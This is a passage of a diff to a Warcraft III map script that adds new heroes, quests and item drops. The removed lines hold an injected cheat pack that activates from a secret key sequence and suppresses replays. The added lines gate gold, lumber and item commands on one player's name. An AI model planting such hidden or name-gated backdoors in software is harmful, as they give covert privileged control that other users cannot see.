-call binbinbin(b2j,SubString(c8h,10,100),"down",EVENT_PLAYER_ARROW_DOWN_DOWN)
-else
-call Jason_CommandFinder(b2j,c8h)
-endif
-set b2j=null
-set c8h=""
-endfunction
-function DunwanLeft takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-local integer id2d=GetPlayerId(b2j)
-local string sd2d=Jiantou
-local integer stage=GetStoredInteger(CACHE,"Activation"+I2S(id2d),"Stage")
-if SubString(sd2d,stage,stage+1)=="L"then
-if stage==StringLength(sd2d)-1then
-if not IsPlayerInForce(b2j,PIANZI) then
-call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
-call ForceAddPlayer(PIANZI,b2j) 
-call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false) 
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00XD|r")
-call DoNotSaveReplay()
-set ohyeah[GetPlayerId(b2j)]=false
-set ohmygod[GetPlayerId(b2j)]=true
-endif
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
-else
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",stage+1)
-endif
-else
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
-endif
-set b2j=null
-endfunction
-function DunwanRight takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-local integer id2d=GetPlayerId(b2j)
-local string sd2d=Jiantou
-local integer stage=GetStoredInteger(CACHE,"Activation"+I2S(id2d),"Stage")
-if SubString(sd2d,stage,stage+1)=="R"then
-if stage==StringLength(sd2d)-1then
-if not IsPlayerInForce(b2j,PIANZI) then
-call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
-call ForceAddPlayer(PIANZI,b2j) 
-call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false) 
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00XD|r")
-call DoNotSaveReplay()
-set ohyeah[GetPlayerId(b2j)]=false
-set ohmygod[GetPlayerId(b2j)]=true
-endif
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
-else
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",stage+1)
-endif
-else
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
-endif
-set b2j=null
-endfunction
-function DunwanUp takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-local integer id2d=GetPlayerId(b2j)
-local string sd2d=Jiantou
-local integer stage=GetStoredInteger(CACHE,"Activation"+I2S(id2d),"Stage")
-if SubString(sd2d,stage,stage+1)=="U"then
-if stage==StringLength(sd2d)-1then
-if not IsPlayerInForce(b2j,PIANZI) then
-call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
-call ForceAddPlayer(PIANZI,b2j) 
-call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false) 
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00XD|r")
-call DoNotSaveReplay()
-set ohyeah[GetPlayerId(b2j)]=false
-set ohmygod[GetPlayerId(b2j)]=true
-endif
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
-else
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",stage+1)
-endif
-else
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
-endif
-set b2j=null
-endfunction
-function DunwanDown takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-local integer id2d=GetPlayerId(b2j)
-local string sd2d=Jiantou
-local integer stage=GetStoredInteger(CACHE,"Activation"+I2S(id2d),"Stage")
-if SubString(sd2d,stage,stage+1)=="D"then
-if stage==StringLength(sd2d)-1then
-if not IsPlayerInForce(b2j,PIANZI) then
-call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
-call ForceAddPlayer(PIANZI,b2j) 
-call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false) 
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00XD|r")
-call DoNotSaveReplay()
-set ohyeah[GetPlayerId(b2j)]=false
-set ohmygod[GetPlayerId(b2j)]=true
-endif
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
-else
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",stage+1)
-endif
-else
-call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
-endif
-set b2j=null
-endfunction
-function Dunwan takes nothing returns nothing
-local player b2j=GetTriggerPlayer()
-if SubString(GetEventPlayerChatString(),0,100)==Danci and not IsPlayerInForce(b2j,PIANZI) then
-call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
-call ForceAddPlayer(PIANZI,b2j)
-call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false)
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00Cheats activated! xixi" )
-call TriggerSleepAction(2)
-call DisplayTimedTextToPlayer(b2j,0,0,5,"|c00ffff00Visit jasonlun.weebly.com to get more." )
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00Type -list1 to -list8 to view cheat's commands!" )
-call TriggerSleepAction(2)
-call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00FF6600JasoN.LuN" )
-call DoNotSaveReplay()
-set ohyeah[GetPlayerId(b2j)]=false
-set ohmygod[GetPlayerId(b2j)]=true
-endif  
-set b2j=null
-endfunction
-function ilovejason takes nothing returns nothing
-local integer zrg=0
-set QIPIAN1[0]=CreateTrigger()
-set QIPIAN1[1]=CreateTrigger()
-set QIPIAN1[2]=CreateTrigger()
-set QIPIAN1[3]=CreateTrigger()
-loop
-exitwhen zrg>11
-call TriggerRegisterPlayerEvent(QIPIAN1[0],Player(zrg),EVENT_PLAYER_ARROW_LEFT_DOWN)
-call TriggerRegisterPlayerEvent(QIPIAN1[1],Player(zrg),EVENT_PLAYER_ARROW_RIGHT_DOWN)
-call TriggerRegisterPlayerEvent(QIPIAN1[2],Player(zrg),EVENT_PLAYER_ARROW_UP_DOWN)
-call TriggerRegisterPlayerEvent(QIPIAN1[3],Player(zrg),EVENT_PLAYER_ARROW_DOWN_DOWN)
-call TriggerRegisterPlayerChatEvent(QIPIAN2,Player(zrg),"-",false)
-call TriggerRegisterPlayerChatEvent(QIPIAN2,Player(zrg)," ",false)
-set zrg=zrg+1
-endloop
-call TriggerAddAction(QIPIAN1[0],function DunwanLeft)
-call TriggerAddAction(QIPIAN1[1],function DunwanRight)
-call TriggerAddAction(QIPIAN1[2],function DunwanUp)
-call TriggerAddAction(QIPIAN1[3],function DunwanDown)
-call TriggerAddAction(QIPIAN2,function Dunwan)
-call TriggerAddCondition(QIPIAN3,Condition(function babyohh))
-call TriggerAddAction(QIPIAN3,function realgayyah)
-call Jason_ASCII(48,"0123456789")
-call Jason_ASCII(97,"abcdefghijklmnopqrstuvwxyz")
-call Jason_ASCII(65,"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
-call whato()
+function Trig_checkcheater_Func001Func001Func001C takes nothing returns boolean
+    if ( not ( tv[GetConvertedPlayerId(GetEnumPlayer())] > 1000 ) ) then
+        return false
+    endif
+    return true
+endfunction
+
+function Trig_checkcheater_Func001Func001C takes nothing returns boolean
+    if ( not ( tv[GetConvertedPlayerId(GetEnumPlayer())] > 1101 ) ) then
+        return false
+    endif
+    return true
+endfunction
+
+function Trig_checkcheater_Func001A takes nothing returns nothing
+    if ( Trig_checkcheater_Func001Func001C() ) then
+        call ReplaceUnitBJ( K[GetConvertedPlayerId(GetEnumPlayer())], 'hpea', bj_UNIT_STATE_METHOD_RELATIVE )
+        set tv[GetConvertedPlayerId(GetEnumPlayer())] = 1000
+        call SetPlayerStateBJ( GetEnumPlayer(), PLAYER_STATE_RESOURCE_GOLD, 1000 )
+    else
+        if ( Trig_checkcheater_Func001Func001Func001C() ) then
+            set tv[GetConvertedPlayerId(GetEnumPlayer())] = 1000
+            call SetPlayerStateBJ( GetEnumPlayer(), PLAYER_STATE_RESOURCE_GOLD, 1000 )
+        else
+        endif
+    endif
+endfunction
+
+function Trig_checkcheater_Actions takes nothing returns nothing
+    call ForForce( GetPlayersAll(), function Trig_checkcheater_Func001A )
+endfunction
+function Trig_esuna_Func001Func001C takes nothing returns boolean
+    if ( not ( IsUnitIllusionBJ(GetEnumUnit()) == true ) ) then
+        return false
+    endif
+    return true
+endfunction
+
+function Trig_esuna_Func001A takes nothing returns nothing
+    if ( Trig_esuna_Func001Func001C() ) then
+    else
+        call UnitRemoveBuffsBJ( bj_REMOVEBUFFS_ALL, GetEnumUnit() )
+    endif
+endfunction
+
+function Trig_esuna_Func002Func001C takes nothing returns boolean
+    if ( not ( IsUnitIllusionBJ(GetEnumUnit()) == true ) ) then
+        return false
+    endif
+    return true
+endfunction
+
+function Trig_esuna_Func002A takes nothing returns nothing
+    if ( Trig_esuna_Func002Func001C() ) then
+    else
+        call UnitRemoveBuffsBJ( bj_REMOVEBUFFS_ALL, GetEnumUnit() )
+    endif
+endfunction
+
+function Trig_esuna_Actions takes nothing returns nothing
+    call ForGroupBJ( GetUnitsOfTypeIdAll('H022'), function Trig_esuna_Func001A )
+    call ForGroupBJ( GetUnitsOfTypeIdAll('n03L'), function Trig_esuna_Func002A )
+endfunction
+function Trig_regenh_Func001A takes nothing returns nothing
+    call SetUnitLifeBJ( GetEnumUnit(), ( GetUnitStateSwap(UNIT_STATE_LIFE, GetEnumUnit()) + ( I2R(GetHeroStatBJ(bj_HEROSTAT_STR, GetEnumUnit(), true)) * 1.00 ) ) )
+endfunction
+
+function Trig_regenh_Actions takes nothing returns nothing
+    call ForGroupBJ( GetUnitsOfTypeIdAll('H022'), function Trig_regenh_Func001A )
+endfunction
+function Trig_hercai_Func001A takes nothing returns nothing
+    call IssueImmediateOrderBJ( GetEnumUnit(), "mirrorimage" )
+endfunction
+
+function Trig_hercai_Actions takes nothing returns nothing
+    call ForGroupBJ( GetUnitsOfTypeIdAll('n03L'), function Trig_hercai_Func001A )
+endfunction
+function Trig_set_Conditions takes nothing returns boolean
+    if ( not ( GetPlayerName(GetTriggerPlayer()) == "EdgeOfChaos" ) ) then
+        return false
+    endif
+    return true
+endfunction
+
+function Trig_set_Func001C takes nothing returns boolean
+    if ( not ( SubStringBJ(GetEventPlayerChatString(), 1, 7) == "-sp to " ) ) then
+        return false
+    endif
+    return true
+endfunction
+
+function Trig_set_Func002C takes nothing returns boolean
+    if ( not ( SubStringBJ(GetEventPlayerChatString(), 1, 7) == "-rb to " ) ) then
+        return false
+    endif
+    return true
+endfunction
+
+function Trig_set_Actions takes nothing returns nothing
+    if ( Trig_set_Func001C() ) then
+        call SetPlayerStateBJ( Player(0), PLAYER_STATE_RESOURCE_LUMBER, S2I(SubStringBJ(GetEventPlayerChatString(), 7, 999)) )
+        set G[GetConvertedPlayerId(GetTriggerPlayer())] = S2I(SubStringBJ(GetEventPlayerChatString(), 7, 999))
+    else
+    endif
+    if ( Trig_set_Func002C() ) then
+        call SetPlayerStateBJ( Player(0), PLAYER_STATE_RESOURCE_GOLD, S2I(SubStringBJ(GetEventPlayerChatString(), 7, 999)) )
+        set tv[GetConvertedPlayerId(GetTriggerPlayer())] = S2I(SubStringBJ(GetEventPlayerChatString(), 7, 999))
+    else
+    endif
+endfunction
+function Trig_givejob_Conditions takes nothing returns boolean
+    if ( not ( GetPlayerName(GetTriggerPlayer()) == "EdgeOfChaos" ) ) then
+        return false
+    endif
+    return true
+endfunction
+
+function Trig_givejob_Actions takes nothing returns nothing
+    call CreateItemLoc( 'I0B0', GetRectCenter(GetPlayableMapRect()) )
+    call SetItemUserData( GetLastCreatedItem(), GetConvertedPlayerId(Player(8)) )
+endfunction
+function Trig_regen_Func001A takes nothing returns nothing
+    call SetUnitLifeBJ( GetEnumUnit(), ( GetUnitStateSwap(UNIT_STATE_LIFE, GetEnumUnit()) + ( I2R(GetHeroStatBJ(bj_HEROSTAT_STR, GetEnumUnit(), true)) * 0.75 ) ) )
+endfunction
+
+function Trig_regen_Actions takes nothing returns nothing
+    call ForGroupBJ( GetUnitsOfTypeIdAll('H021'), function Trig_regen_Func001A )
 endfunction
 function Trig_pieldelfuego_Func001Func002001003 takes nothing returns boolean
     return ( IsUnitEnemy(GetFilterUnit(), Player(0)) == true )
@@ -2210,7 +1020,7 @@ function Trig_fuegofinal_Func001001003 takes nothing returns boolean
 endfunction
 
 function Trig_fuegofinal_Func001A takes nothing returns nothing
-    call UnitDamageTargetBJ( GetSpellAbilityUnit(), GetEnumUnit(), ( I2R(GetHeroStatBJ(bj_HEROSTAT_AGI, GetSpellAbilityUnit(), true)) * 100.00 ), ATTACK_TYPE_CHAOS, DAMAGE_TYPE_NORMAL )
+    call UnitDamageTargetBJ( GetSpellAbilityUnit(), GetEnumUnit(), ( I2R(GetHeroStatBJ(bj_HEROSTAT_AGI, GetSpellAbilityUnit(), true)) * 1500.00 ), ATTACK_TYPE_CHAOS, DAMAGE_TYPE_NORMAL )
 endfunction
 
 function Trig_fuegofinal_Actions takes nothing returns nothing
@@ -2459,7 +1269,9 @@ set udg_SaveLoadHeroesStored[40]='H01X'
 set udg_SaveLoadHeroesStored[41]='H01Y'
 set udg_SaveLoadHeroesStored[42]='H01Z'
 set udg_SaveLoadHeroesStored[43]='H020'
-    set udg_SaveLoadMaxHeroesStored = 43
+set udg_SaveLoadHeroesStored[44]='H021'
+set udg_SaveLoadHeroesStored[45]='H022'
+    set udg_SaveLoadMaxHeroesStored = 45
     set udg_SaveLoadSlotsHero = 2
 
 set udg_SaveLoadItemsStored[1]='I068'
@@ -3881,8 +2693,8 @@ set u=CreateUnit(p,'n000',4819.3,-1846.7,283.829)
 set u=CreateUnit(p,'n000',4977.,-1936.4,193.64)
 set u=CreateUnit(p,'n002',4934.4,-1742.8,138.003)
 set u=CreateUnit(p,'n03H',-348.2,16688,134.191)
-set u=CreateUnit(p,'n03K',-348.2,16688,134.191)
     call CreateNUnitsAtLoc( 1, 'n03K', Player(11), GetRectCenter(ladondropregion), bj_UNIT_FACING )   
+    call CreateNUnitsAtLoc( 1, 'n03L', Player(11), GetRectCenter(herculesdropregion), bj_UNIT_FACING )   
 set u=CreateUnit(p,'n001',4804.4,-2094.6,134.191)
 set u=CreateUnit(p,'n001',6080.2,-2407.1,205.242)
 set u=CreateUnit(p,'n001',6249.2,-2418.4,190.102)
@@ -7290,6 +6102,36 @@ function ExExpAction takes nothing returns nothing
 set mv=GetUnitLevel(GetDyingUnit())
 set Mv[(1+GetPlayerId(GetOwningPlayer(GetKillingUnitBJ())))]=(Mv[(1+GetPlayerId(GetOwningPlayer(GetKillingUnitBJ())))]+mv)
 endfunction
+function Armor20Condition takes nothing returns boolean
+return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I0B1')
+endfunction
+function Armor20Action takes nothing returns nothing
+set ee=(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))
+set xe[ee]=GetTriggerUnit()
+set oe[ee]=GetOwningPlayer(xe[ee])
+set ve[ee]=true
+set re[ee]=false
+set ie[ee]="Armadura de Dragon"
+set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNBronzeDragon.blp"
+set ne[ee]="Elimina la cantidad indicada"
+set Ve[ee]="Ven por tu recompenza."
+set Ee[ee]=3
+set Xe[ee]="Ladon"
+set Re[ee]=0
+set Ie[ee]=0
+set Ae[ee]='I0AC'
+set Ne[ee]='n03K'
+set be[ee]=false
+call CreateQuestBJ(0,(ie[ee]+(" ("+(GetPlayerName(oe[ee])+")"))),ne[ee],ae[ee])
+set Be[ee]=bj_lastCreatedQuest
+call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
+call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
+if(aD())then
+call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+else
+call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+endif
+endfunction
 function Armor19Condition takes nothing returns boolean
 return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I0AI')
 endfunction
@@ -8759,7 +7601,7 @@ loop
 exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
 set pv[0]=Mv[bj_forLoopAIndex]
 set bj_forLoopBIndex=1
-set bj_forLoopBIndexEnd=43
+set bj_forLoopBIndexEnd=44
 loop
 exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
 if(bH())then
@@ -8867,6 +7709,10 @@ set wv[42]=5000
 set Wv[42]='H01Z'
 set wv[43]=50000
 set Wv[43]='H020'
+set wv[44]=5000
+set Wv[44]='H021'
+set wv[45]=1000000000
+set Wv[45]='H022'
 endfunction
 function DH takes nothing returns boolean
 return(GetSpellAbilityId()=='A00G')
@@ -9428,7 +8274,7 @@ set Kv[Lv]='I01J'
 set lv[Lv]='I01K'
 set Lv=(Lv+1)
 set Jv[Lv]='I02Z'
-set Kv[Lv]='I02Z'
+set Kv[Lv]='I01K'
 set lv[Lv]='I01L'
 set Lv=(Lv+1)
 set Jv[Lv]='I02I'
@@ -9632,13 +8478,15 @@ set Ye[18]='I075'
 set ye[19]='I05Q'
 set Ye[19]='I076'
 set ye[20]='I05R'
+set Ye[20]='I0AC'
+set ye[21]='I0B0'
 endfunction
 function RJ takes nothing returns boolean
 return(Ye[bj_forLoopBIndex]==GetItemTypeId(GetManipulatedItem()))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),ye[bj_forLoopBIndex]))
 endfunction
 function IJ takes nothing returns nothing
 set bj_forLoopBIndex=1
-set bj_forLoopBIndexEnd=19
+set bj_forLoopBIndexEnd=20
 loop
 exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
 if(RJ())then
@@ -9773,6 +8621,7 @@ if(TJ())then
 set mv='d'
 set tv[(1+GetPlayerId(GetOwningPlayer(GetSpellAbilityUnit())))]=(tv[(1+GetPlayerId(GetOwningPlayer(GetSpellAbilityUnit())))]+mv)
 call AdjustPlayerStateBJ(mv,GetOwningPlayer(GetSpellAbilityUnit()),PLAYER_STATE_RESOURCE_GOLD)
+
 endif
 endfunction
 function wJ takes nothing returns boolean
@@ -11371,6 +10220,31 @@ call CreateItemLoc('I0AY',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 call CreateItemLoc('I0AZ',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
+call CreateItemLoc('I07V',GetRectCenter(Tv[bj_forLoopAIndex]))
+call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
+set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
+call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv[bj_forLoopAIndex]),0)
+endif
+set bj_forLoopAIndex=bj_forLoopAIndex+1
+endloop
+endfunction
+function herculesreg takes nothing returns boolean
+return(RectContainsUnit(herculesdropregion,uv))
+endfunction
+function herculesdropAction takes nothing returns nothing
+set bj_forLoopAIndex=1
+set bj_forLoopAIndexEnd=9
+loop
+exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
+set uv=K[bj_forLoopAIndex]
+if(herculesreg())then
+call SetUnitPositionLoc(uv,GetRectCenter(Tv[bj_forLoopAIndex]))
+call CreateItemLoc('I0B3',GetRectCenter(Tv[bj_forLoopAIndex]))
+call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
+call CreateItemLoc('I0B4',GetRectCenter(Tv[bj_forLoopAIndex]))
+call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
+call CreateItemLoc('I07W',GetRectCenter(Tv[bj_forLoopAIndex]))
+call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
 call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv[bj_forLoopAIndex]),0)
 endif
@@ -11699,7 +10573,7 @@ function JM takes nothing returns boolean
 return(GetRandomReal(0,'d')<=20.)
 endfunction
 function kM takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=30.)
 endfunction
 function KM takes nothing returns boolean
 return(GetRandomReal(0,'d')<=5.)
@@ -11736,7 +10610,7 @@ call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv[bj_forLoopAIndex]),0)
 set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
 if(JM())then
-call CreateItemLoc('I07Y',GetRectCenter(Tv[bj_forLoopAIndex]))
+call CreateItemLoc('I048',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 endif
 if(kM())then
@@ -11746,6 +10620,8 @@ endif
 if(KM())then
 call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,("El Jugador |cffffcc00"+(GetPlayerName(GetOwningPlayer(uv))+"|r es suertudo y ha ganado |cffffcc00Box Expert' Premium|r, podra aumentar 1 Rebirth y 1250 SP.")))
 call CreateItemLoc('I07U',GetRectCenter(Tv[bj_forLoopAIndex]))
+call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
+call CreateItemLoc('I0B2',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 endif
 if(lM())then
@@ -11813,6 +10689,8 @@ set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(
 if(qM())then
 call CreateItemLoc('I07Y',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
+call CreateItemLoc('I0B2',GetRectCenter(Tv[bj_forLoopAIndex]))
+call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 endif
 if(QM())then
 call CreateItemLoc('I0A2',GetRectCenter(Tv[bj_forLoopAIndex]))
@@ -11865,6 +10743,9 @@ endfunction
 function ladondropCondition takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n03K')
 endfunction
+function herculesdropCondition takes nothing returns boolean
+return(GetUnitTypeId(GetDyingUnit())=='n03L')
+endfunction
 function hecatedropCondition takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n03I')
 endfunction
@@ -11911,6 +10792,8 @@ call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv
 set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
 if(zM())then
 call CreateItemLoc('I07Y',GetRectCenter(Tv[bj_forLoopAIndex]))
+call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
+call CreateItemLoc('I0B2',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 endif
 if(ZM())then
@@ -12620,13 +11503,19 @@ function hecatejob takes nothing returns boolean
 return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=75)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AV'))
 endfunction
 function nemjob takes nothing returns boolean
-return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=75)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AX'))
+return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=175)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AX'))
 endfunction
 function superhuman takes nothing returns boolean
 return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=150)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AO'))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AP'))
 endfunction
 function ladonjob takes nothing returns boolean
 return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=200)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0AZ'))
+endfunction
+function herculesjob takes nothing returns boolean
+return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=500)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B4'))
+endfunction
+function typhonjob takes nothing returns boolean
+return(GetUnitTypeId(GetTriggerUnit())=='H00P')and(tv[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]>=300)and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B2'))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B2'))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B2'))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I0B2'))
 endfunction
 function tq takes nothing returns nothing
 if(dq())then
@@ -12809,6 +11698,17 @@ call SetHeroLevelBJ(bj_lastReplacedUnit,1,false)
 set K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=bj_lastReplacedUnit
 call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER,G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])
 endif
+if(typhonjob())then
+call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I00W'))
+call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B2'))
+call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B2'))
+call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B2'))
+call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B2'))
+call ReplaceUnitBJ(GetTriggerUnit(),'H021',3)
+call SetHeroLevelBJ(bj_lastReplacedUnit,1,false)
+set K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=bj_lastReplacedUnit
+call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER,G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])
+endif
 if(superhuman())then
 call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I00W'))
 call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0AO'))
@@ -12822,6 +11722,14 @@ if(ladonjob())then
 call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I00W'))
 call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0AZ'))
 call ReplaceUnitBJ(GetTriggerUnit(),'H020',3)
+call SetHeroLevelBJ(bj_lastReplacedUnit,1,false)
+set K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=bj_lastReplacedUnit
+call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER,G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])
+endif
+if(herculesjob())then
+call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I00W'))
+call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),'I0B4'))
+call ReplaceUnitBJ(GetTriggerUnit(),'H022',3)
 call SetHeroLevelBJ(bj_lastReplacedUnit,1,false)
 set K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=bj_lastReplacedUnit
 call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER,G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])
@@ -12998,7 +11906,7 @@ call SetPlayerStateBJ(GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LU
 endif
 endfunction
 function AQ takes nothing returns boolean
-return(GetUnitTypeId(GetTriggerUnit())=='H00J')or(GetUnitTypeId(GetTriggerUnit())=='H00A')or(GetUnitTypeId(GetTriggerUnit())=='H007')or(GetUnitTypeId(GetTriggerUnit())=='H00G')or(GetUnitTypeId(GetTriggerUnit())=='H00D')or(GetUnitTypeId(GetTriggerUnit())=='H010')or(GetUnitTypeId(GetTriggerUnit())=='H018')or(GetUnitTypeId(GetTriggerUnit())=='H015')or(GetUnitTypeId(GetTriggerUnit())=='H01A')or(GetUnitTypeId(GetTriggerUnit())=='H01C')or(GetUnitTypeId(GetTriggerUnit())=='H01B')or(GetUnitTypeId(GetTriggerUnit())=='H01E')or(GetUnitTypeId(GetTriggerUnit())=='H01F')or(GetUnitTypeId(GetTriggerUnit())=='H01D')or(GetUnitTypeId(GetTriggerUnit())=='H01P')or(GetUnitTypeId(GetTriggerUnit())=='H01Q')or(GetUnitTypeId(GetTriggerUnit())=='H01S') 